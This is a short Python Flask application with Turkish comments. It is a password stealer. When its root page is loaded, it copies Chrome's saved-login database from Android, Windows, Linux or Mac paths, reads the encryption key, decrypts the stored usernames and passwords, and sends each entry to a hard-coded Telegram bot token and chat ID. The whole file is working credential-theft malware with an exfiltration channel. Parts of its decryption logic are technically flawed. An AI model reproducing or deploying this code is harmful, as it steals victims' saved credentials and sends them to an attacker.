# app.py
from flask import Flask
import telebot
import os
import sqlite3
import shutil
import json
import base64
import time

app = Flask(__name__)

BOT_TOKEN = "8258388271:AAEr5lwYGZppBtSRy-c3wXCWu4Dr_GwASfI"
CHAT_ID = 7323434112
bot = telebot.TeleBot(BOT_TOKEN)

# Şifre decrypt (basit, Android/PC için uyarlı)
def decrypt_password(encrypted, key):
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        iv = encrypted[3:15]
        ciphertext = encrypted[15:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv))
        decryptor = cipher.decryptor()
        return (decryptor.update(ciphertext) + decryptor.finalize()).decode()
    except:
        return "[Decrypt edilemedi]"

def sifre_cek():
    sifreler = []
    # Android/PC yolları (çalışan cihazda otomatik bulur)
    paths = [
        "/data/data/com.android.chrome/app_chrome/Default/Login Data",  # Android
        os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data",  # Win
        os.path.expanduser("~") + "/.config/google-chrome/Default/Login Data",  # Linux
        os.path.expanduser("~") + "/Library/Application Support/Google/Chrome/Default/Login Data"  # Mac
    ]
    for login_data in paths:
        if not os.path.exists(login_data):
            continue
        local_state = login_data.replace("Login Data", "Local State")
        if not os.path.exists(local_state):
            continue
        try:
            with open(local_state, 'r') as f:
                ls = json.load(f)
            enc_key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
            
            shutil.copy(login_data, 'Login Data')
            conn = sqlite3.connect('Login Data')
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url, user, enc_pass = row
                passw = decrypt_password(enc_pass, enc_key)
                sifreler.append(f"Site: {url}\nKullanıcı: {user}\nŞifre: {passw}")
            conn.close()
            os.remove('Login Data')
        except Exception as e:
            sifreler.append(f"Hata: {e}")
    return sifreler or ["Şifre yok reis."]

@app.route('/')
def home():
    bot.send_message(CHAT_ID, "REİS, ŞİFRELER ÇEKİLİYOR... 🔑")
    sifreler = sifre_cek()
    for sifre in sifreler:
        bot.send_message(CHAT_ID, sifre)
        time.sleep(0.5)
    bot.send_message(CHAT_ID, f"✅ BİTTİ! {len(sifreler)} ŞİFRE")
    return "<h1>ŞİFRELER GÖNDERİLDİ REİS!</h1>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
